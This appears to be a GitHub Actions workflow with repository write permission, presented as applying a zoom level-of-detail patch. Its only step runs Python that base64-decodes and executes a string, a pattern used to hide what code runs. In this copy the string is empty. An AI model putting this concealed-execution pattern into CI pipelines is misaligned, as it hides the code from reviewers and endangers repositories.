name: Apply progressive free zoom LOD once

on:
  push:
    paths:
      - .github/workflows/apply-progressive-freezoom-once.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply progressive LOD patch
        run: python3 -c "import base64;exec(base64.b64decode(' '))"